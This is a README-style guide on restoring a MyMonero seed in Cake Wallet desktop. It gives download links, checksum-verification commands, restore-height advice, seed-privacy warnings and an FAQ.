<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Cake Wallet as an Alternative to MyMonero</h1>
<p align="center">How Cake Wallet can restore a MyMonero seed and what to consider first.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer
Cake Wallet is a Monero (XMR) wallet and can restore a MyMonero seed. That makes it a practical option to consider now that MyMonero desktop is no longer maintained: the older app may still open wallets, but hosted servers and web login stopped and there are no updates. Moving does not require rushing or transferring funds. Start by preserving your backup and identifying its word count.

## You'll see this if
- You have a saved wallet backup and want to use it in Cake Wallet.
- The app asks you to select a restore path or wait for a scan.
- The history or balance does not appear immediately, or you are checking which desktop download is appropriate.
- You want to make a change carefully without exposing your recovery information.

> [!WARNING]
> Your seed, keys, and PIN are private. Nobody legitimate asks you to send them. Do not share them with support, in a message, or in a screenshot.

## Why it happens
Wallet restoration can be confusing because the backup, the application, and the scan are separate parts of the process. A valid seed can be entered correctly while the wallet is still scanning, and an incomplete history display is not by itself proof that the seed is wrong. Conversely, a plausible-looking screen does not justify exposing the seed or sending funds. Keep each decision deliberate: confirm the intended application, use the right restore path for the backup format, and give the scan time.

The seed is the sensitive part. Anyone who obtains it may be able to control the wallet, so support staff and legitimate maintainers do not need you to disclose it. Do not photograph it with a synced device, copy it into a browser form, or include it in a screenshot. If you need to check the phrase, do so offline and privately. For a recovery or migration topic, be especially alert to impersonators asking for words, keys, a PIN, or remote access.

A useful way to avoid confusion is to keep a short, non-secret record of what you observed: the number of words in the backup, whether the restore was accepted, and whether a scan is still underway. Do not include the seed, private keys, PIN, or a screenshot of sensitive screens. These observations can help you make a measured next step without increasing exposure.

## Fix
1. **Prepare privately.** Locate the original backup and read its word count without sharing the words. Check that the words are legible and in their recorded order. Do not try random substitutions or rearrangements. Keep the seed away from cameras, shared screens, and clipboard history.
2. **Get the desktop application from the official project release.** Confirm that you are on the Cake-LabsLLC project on GitHub, and select the asset for your operating system. Avoid download mirrors and links sent in unsolicited messages. The release contains separate platform files; make sure the filename matches the system you use.
3. **Verify the download.** Compare the file’s SHA-256 with the value shown on the same GitHub release page. On Windows, `certutil -hashfile <file> SHA256` can calculate it; on macOS, use `shasum -a 256 <file>`. On Linux, the equivalent is `sha256sum <file>`. The calculated value must match exactly. Do not rely on an unverified value copied from elsewhere.
4. **Open the application and choose its restore option.** Follow the general prompts on screen. Use the seed format that matches the backup; do not treat 13 and 25 words as interchangeable. Enter words only in the wallet app you have just verified. Never send them to someone claiming to help.
5. **Set a conservative scan start.** If asked for a restore height, use a point early enough to include the wallet’s activity. An earlier height is safer when the creation date is uncertain, though scanning takes longer. Do not choose a recent point solely to make setup appear faster.
6. **Let the wallet scan and assess the result.** Keep the app open and allow it time to process. Compare the displayed wallet information and history with what you reasonably expect, while remembering that a scan may not finish immediately. Avoid repeated restores with different guesses until the first scan has had a fair chance.
7. **Keep recovery options secure.** Once satisfied, protect the backup in a private, durable place. A transfer of funds is optional, not a requirement for restoration. If you deliberately decide to sweep, verify the destination wallet and address independently before authorizing anything.

> [!TIP]
> If you are unsure about timing, allow a longer scan by choosing an earlier restore height. A slower scan is preferable to silently excluding older wallet activity.

---

## If that did not work
If the phrase is rejected, stop after checking the obvious details: word count, order, spelling as recorded, and whether you selected the matching restore format. Do not post the seed for troubleshooting. A newer wallet may use a different seed format; check the word count your backup shows. If the app accepts the seed but shows no expected history, review the restore height and allow the scan to complete before concluding that funds are missing.

For a slow or apparently stalled scan, keep the application open, check that the computer remains connected, and restart only if the application is clearly unresponsive. If you repeat the restore, use the same verified application and a suitably early height. Never respond to unsolicited messages promising recovery, and never grant remote access to someone who asks for your seed or PIN. The person or service that can see your seed can potentially control the wallet.

If installation fails, verify the correct release asset and recalculate its checksum. A mismatch means do not open the file; obtain a clean copy from the project release. Never bypass security warnings.

## Prevention
Keep a backup in a secure place separate from your everyday computer, and make sure you can identify its format without exposing the words. Do not edit the only copy. When installing an application, use the project release and verify the checksum before opening the downloaded file. Keep a written note of non-secret recovery context, such as the approximate wallet creation period, stored separately from the seed; this can help you choose a scan start without recording secret material. Make changes only when you understand whether they restore access or actually transfer funds.

[Cake Wallet migration walkthrough](./cake-wallet-mymonero-migration.md), [Cake Wallet 13-word restoration](./cake-wallet-restore-13-word-seed.md), and [Cake Wallet 25-word restoration](./cake-wallet-restore-25-word-seed.md) cover related decisions. For additional context, see [Cake Wallet vs MyMonero comparison](./cake-wallet-vs-mymonero.md), [Cake Wallet restore-height guide](./cake-wallet-restore-height.md), and [Cake Wallet desktop project](https://github.com/Cake-LabsLLC/cake-wallet-desktop). The project source is also available through [Cake Wallet migration checklist](./cake-wallet-migration-checklist.md). Read the relevant guidance before changing wallet state, and use the official release source for desktop files.

## FAQ
<details><summary>Can I restore a MyMonero seed in Cake Wallet?</summary>

Yes. Cake Wallet can restore a MyMonero seed. Select the restore option and use the format corresponding to the word count in your backup.

</details>

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate needs your seed, private keys, or PIN. Keep them private, including in screenshots and messages.

</details>

<details><summary>Does restoration move my funds?</summary>

No. Restoration accesses the wallet from its backup; sweeping is a separate action that sends all funds to a new wallet. A sweep is not required just to restore.

</details>

<details><summary>Why is my history not visible yet?</summary>

The wallet may still be scanning, or the chosen restore height may be too recent. Allow the scan to proceed and consider an earlier height if you are unsure when the wallet was created.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Move from MyMonero to Cake Wallet](./cake-wallet-mymonero-migration.md) | A careful path for restoring a MyMonero backup and checking the result. |
| [Restore a 13-Word MyMonero Seed in Cake Wallet](./cake-wallet-restore-13-word-seed.md) | What to check when your MyMonero backup contains 13 words. |
| [Restore a 25-Word Monero Seed in Cake Wallet](./cake-wallet-restore-25-word-seed.md) | Restore a standard Monero seed and allow the wallet to scan. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
